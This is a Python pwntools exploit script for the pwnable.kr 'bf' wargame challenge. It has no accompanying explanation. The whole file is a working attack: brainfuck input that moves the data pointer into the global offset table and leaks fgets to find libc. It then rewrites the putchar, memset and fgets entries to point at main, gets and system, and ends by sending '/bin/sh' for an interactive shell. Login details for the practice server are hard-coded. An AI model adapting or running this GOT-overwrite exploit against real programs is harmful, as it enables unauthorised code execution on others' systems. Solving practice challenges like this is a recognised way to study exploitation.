import struct
import socket
import os
import pwn

IP = 'pwnable.kr'
PORT = 9001
SSH_PORT = 2222
USER = 'unlink'
PASSWORD = 'guest'
FILENAME = './input.txt'
FILENAME2 = './input2.txt'
LOCAL_CMD = './bf < {}'.format(FILENAME)
CHUNK = 2048

MAIN_ADDR = 0x08048671
P_ADDR = 0x0804a0a0
main = 0x08048671
fgets_GOT = 0x0804a010
memset_GOT = 0x0804a02c
putchar_GOT = 0x0804a030
getchar_GOT = 0x0804a00c
__stack_chk_fail_GOT = 0x0804a014

system_bf_libc = 0x3ada0
fgets_bf_libc = 0x5e150
gets_bf_libc = 0x5f3e0
memset_bf_libc = 0x76fc0
putchar_bf_libc = 0x61920
getchar_bf_libc = 0x65b40
_IO_puts_bf_libc = 0x5fca0
__stack_chk_fail_bf_libc = 0xf7680

system_my_libc = 0x423d0
fgets_my_libc = 0x6a720
_IO_puts_my_libc = 0x6c140
__stack_chk_fail_my_libc = 0x10b790

def main():
	
	skt = pwn.ssh (host = IP, port = SSH_PORT, user = USER, password = PASSWORD)
	pwn.context.log_level = 'debug'
	ps = skt.process (["nc", "0", "9001"])
	

	toSend = ''
	# leak fgets address on libc
	# go to fgets GOT
	toSend += '<' * (P_ADDR - fgets_GOT)
	# print address
	toSend += '.>' * 4
	# restore
	toSend += '>' * (P_ADDR - fgets_GOT - 4)

	# overwrite the putchar GOT entry to main address
	toSend += '<' * (P_ADDR - putchar_GOT)
	# write 4 bytes
	toSend += ',>' * 4
	# restore
	toSend += '>' * (P_ADDR - putchar_GOT - 4)
	# trigger putchar so main is called
	toSend += '.'

	toSend += '\n'
	toSend += struct.pack ('<I', MAIN_ADDR)

	with open (FILENAME, 'w') as f:
		f.write (toSend)

	print ('remote running..')
	# print welcome message 
	data = ps.recv (CHUNK)
	print (data)

	ps.send (toSend)

	# prints leaked address and secondary welcome
	data = ps.recv (CHUNK)
	print (data)
	addr = data[0:4]
	addr = struct.unpack ('<I', addr)
	libc_address_int = int(addr[0])-fgets_bf_libc
	libc_address = hex(libc_address_int)
	print ('libc Address is:{}'.format(libc_address))

	memset_address = libc_address_int + memset_bf_libc
	fgets_address = libc_address_int + fgets_bf_libc
	gets_address = libc_address_int + gets_bf_libc
	system_address = libc_address_int + system_bf_libc

	toSend = ''
	# overwrite the memset GOT entry to fgets address
	toSend += '<' * (P_ADDR - memset_GOT)
	# write 4 bytes
	toSend += ',>' * 4
	# restore
	toSend += '>' * (P_ADDR - memset_GOT - 4)
	
	# overwrite the fgets GOT entry to system address
	toSend += '<' * (P_ADDR - fgets_GOT)
	# write 4 bytes
	toSend += ',>' * 4
	# restore
	toSend += '>' * (P_ADDR - fgets_GOT - 4)

	# trigger putchar
	toSend += '.'
	toSend += '\n'
	toSend += struct.pack ('<I', gets_address)
	toSend += struct.pack ('<I', system_address)

	with open (FILENAME2, 'w') as f:
		f.write (toSend)

	ps.send (toSend)

	# print third welcome
	data = ps.recv (CHUNK)
	print (data)
	ps.send ('/bin/sh\n')
	ps.interactive()
	
	return

if __name__ == '__main__':
	main()